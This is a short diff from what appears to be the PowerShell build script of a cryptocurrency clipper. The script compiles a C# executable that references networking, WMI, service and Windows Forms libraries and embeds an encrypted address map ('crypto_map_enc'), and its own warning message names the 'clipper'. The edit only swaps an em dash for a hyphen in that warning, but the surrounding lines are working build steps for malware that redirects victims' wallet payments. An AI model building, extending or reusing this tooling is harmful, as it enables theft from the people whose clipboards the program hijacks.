@@ -92,7 +92,7 @@ $sourceList = @(
 )
 
 $cscCmd = "`"$csc`" /target:exe /platform:x86 /out:`"$out`" /r:System.Net.Http.dll /r:System.Drawing.dll /r:System.Management.dll /r:System.ServiceProcess.dll /r:System.Windows.Forms.dll"
-if (Test-Path $resMap) { $cscCmd = $cscCmd + " /res:`"$resMap`",crypto_map_enc" } else { Write-Host "WARNING: crypto_map_enc not found at $resMap — clipper won't load addresses" }
+if (Test-Path $resMap) { $cscCmd = $cscCmd + " /res:`"$resMap`",crypto_map_enc" } else { Write-Host "WARNING: crypto_map_enc not found at $resMap - clipper won't load addresses" }
 foreach ($s in $sourceList) { $cscCmd = $cscCmd + " `"$s`"" }
 
 Write-Host "[*] Compiling..."
